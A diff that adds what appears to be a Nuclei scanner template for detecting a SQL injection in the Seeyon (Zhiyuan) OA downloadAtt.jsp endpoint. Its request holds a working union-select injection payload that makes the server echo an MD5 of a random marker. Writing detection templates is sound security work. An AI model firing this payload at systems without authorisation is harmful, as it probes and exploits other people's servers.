@@ -1,0 +1,26 @@
+id: seeyon-downloadatt-sqli
+
+info:
+  name: Seeyon downloadAtt SQL Injection
+  author: local
+  severity: high
+  description: Detects the Seeyon downloadAtt SQL injection using a random MD5 marker.
+  tags: seeyon,zhiyuan,sqli,active
+
+variables:
+  marker: "{{rand_int(200000000, 210000000)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5({{marker}}),7--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{md5(marker)}}'
+
